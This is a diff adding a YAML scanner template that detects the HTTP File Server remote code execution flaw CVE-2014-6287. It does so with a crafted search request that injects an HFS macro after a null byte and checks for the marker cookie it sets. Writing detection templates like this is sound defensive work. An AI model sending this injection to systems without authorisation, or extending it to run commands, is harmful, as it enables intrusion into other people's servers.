@@ -1,0 +1,58 @@
+id: HTTP_FILE_SERVER_RCE
+info:
+  name: "HTTP File Server Remote Code Execution"
+  description: "The HTTP File Server (HFS) Remote Code Execution vulnerability affects improperly configured or outdated versions of HFS, a lightweight file-sharing server. Attackers can exploit this flaw by sending specially crafted requests to execute arbitrary code on the server. This vulnerability is commonly associated with HFS v2.3.x, making systems running this version susceptible to unauthorized access and control." 
+  details: "The HTTP File Server Remote Code Execution vulnerability, arises from improper handling of user-supplied input in the HFS application. Attackers can craft malicious requests that trigger the execution of arbitrary commands on the server. This vulnerability is particularly dangerous because it allows for unauthorized access to the file system and potential data manipulation. Ensuring HFS is updated and properly configured is essential for mitigating this risk."
+  impact: "The impact of the HTTP File Server Remote Code Execution vulnerability is significant, as it enables attackers to gain complete control over the affected server. This can lead to unauthorized access to sensitive files, data theft, or the installation of malware. Additionally, compromised servers can be used for further attacks on other systems, making timely updates and security measures crucial to prevent exploitation."
+  category:
+    name: COMMAND_INJECTION
+    shortName: Command Injection
+    displayName: Command Injection
+  subCategory: HTTP_FILE_SERVER_RCE
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  cwe:
+    - CWE-78
+  cve:
+    - CVE-2014-6287
+api_selection_filters:
+  response_payload:
+    length:
+      gt: 0
+  method:
+    neq: "OPTIONS"
+
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_method: GET
+        - replace_body: '{}'
+        - modify_url: "/?search==%00{.cookie|abcdef|value%3dCVE-2014-6287.}"
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    length:
+      gt: 0
+    contains_either:
+      - "<title>HFS /</title>"
+  and:
+  - response_headers:
+      for_one:
+        key:
+          eq: "Set-Cookie"
+        value:
+          eq: "abcdef=CVE-2014-6287"
+  - response_headers:
+      for_one:
+        key:
+          eq: "content-type"
+        value:
+          eq: "text/html"
+
+strategy:
+  run_once: /
